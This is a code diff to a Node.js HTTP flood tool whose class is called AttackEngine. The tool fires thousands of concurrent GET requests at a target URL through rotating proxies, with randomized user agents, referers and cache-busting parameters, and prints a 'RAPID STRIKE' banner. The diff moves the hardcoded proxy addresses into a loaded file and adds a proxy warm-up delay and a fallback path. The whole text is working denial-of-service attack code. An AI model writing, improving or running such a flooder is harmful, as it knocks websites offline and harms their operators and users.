@@ -8,24 +8,7 @@ const process = require('process');
 const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 5540);
 const REQUEST_TIMEOUT = 60000;
 
-const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');
-const UA_POOL = Array.from({ length: 10000 }, () =>
-    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
-);
-
-const keepAliveHttp = new http.Agent({ keepAlive: true });
-const keepAliveHttps = new https.Agent({ keepAlive: true });
-
-const PROXIES = [
-    "61.164.204.130:4999",
-    "218.98.160.110:12798",
-    "60.174.167.40:4999",
-    "119.39.5.93:3128"
-];
-
-const USED_PROXIES = new Set();
-
+// Loaders
 function loadLines(filename) {
     try {
         return fs.readFileSync(filename, 'utf8')
@@ -36,6 +19,20 @@ function loadLines(filename) {
         return [];
     }
 }
+
+// Load resources
+const REFERERS = loadLines('refs.txt');
+const USER_AGENTS = loadLines('ua.txt');
+const PROXIES = loadLines('proxies.txt');
+
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
+);
+
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
+
+const USED_PROXIES = new Set();
 
 class AttackEngine {
     constructor(target, duration) {
@@ -79,22 +76,27 @@ class AttackEngine {
 
         const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
         const isHttps = this.target.startsWith('https');
-        const proxyAddr = this.getRandomProxy();
-        const [proxyHost, proxyPort] = proxyAddr.split(':');
         const fallbackAgent = isHttps ? keepAliveHttps : keepAliveHttp;
 
+        const proxyAddr = this.getRandomProxy();
+        let proxyUsed = false;
+
         try {
-            await axios.get(urlWithNoise, {
-                headers,
-                timeout: REQUEST_TIMEOUT,
-                proxy: {
-                    host: proxyHost,
-                    port: parseInt(proxyPort)
-                },
-                validateStatus: null
-            });
-            this.stats.success++;
-            USED_PROXIES.add(proxyAddr);
+            if (proxyAddr) {
+                const [host, port] = proxyAddr.split(':');
+                await axios.get(urlWithNoise, {
+                    headers,
+                    timeout: REQUEST_TIMEOUT,
+                    proxy: {
+                        host,
+                        port: parseInt(port)
+                    },
+                    validateStatus: null
+                });
+                USED_PROXIES.add(proxyAddr);
+                proxyUsed = true;
+                this.stats.success++;
+            }
         } catch {
             try {
                 await axios.get(urlWithNoise, {
@@ -134,6 +136,11 @@ class AttackEngine {
         console.log(`  TARGET: ${this.target}`);
         console.log(`  TIME:   ${this.duration / 1000}s`);
         console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
+        console.log('  LOADING PROXIES...');
+
+        // Give proxies time to "warm up"
+        await new Promise(res => setTimeout(res, 1500));
+
         console.log('  ============================================\n');
 
         let lastTotal = 0;
